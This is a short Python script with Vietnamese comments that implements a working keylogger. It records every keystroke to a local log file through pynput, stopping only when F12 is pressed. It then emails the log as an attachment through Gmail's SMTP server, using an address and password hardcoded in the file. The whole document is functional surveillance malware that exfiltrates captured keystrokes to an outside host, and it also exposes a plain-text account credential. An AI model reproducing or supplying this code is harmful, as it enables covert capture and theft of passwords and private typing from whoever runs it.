import email , smtplib , ssl

from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

from pynput.keyboard import Listener	

def anonymous (key):

	key=str(key)

	key = key.replace("'" , "")

	if key == "Key.f12":
		raise SystemExit(0)

	with open("log.txt" , "a") as file:
		file.write(str(key) + " ")

with open("log.txt" , "a") as file:
	file.write("\n")

with Listener(on_press = anonymous) as listener:
	listener.join()


with open("log.txt" , "a") as file:
	file.write("\n")

#lay thong tin gmail gửi
email = "tameanhanh@gmail.com"
pwd = "asdata448"
address = "tameanhanh@gmail.com"
file = "log.txt"
body = "file log"

#tạo massage
message = MIMEMultipart()
message["From"] = email
message["To"] = address
message["Bcc"] = address  

message.attach(MIMEText(body, "plain"))

#mở file
with open(file, "rb") as attachment:
	
	#tạo file dưới dạng tệp đính kèm (octet-stream)
	part = MIMEBase("application", "octet-stream")
	part.set_payload(attachment.read())

#encode (mã hóa file)
encoders.encode_base64(part)

# thêm tiêu đề dưới dạng cặp khóa
part.add_header(
    "Content-Disposition",
    f"attachment; filename= {file}",
)

# chuyển đổi tin nhắn thành chuỗi
message.attach(part)
text = message.as_string()

#gửi gmail
client = smtplib.SMTP("smtp.gmail.com" , 587)
client.starttls()
try:
	client.login(email, pwd)

	client.sendmail(email , address , text)

	print("MSG send to " + str(address))
except:
	print("error")

client.quit()

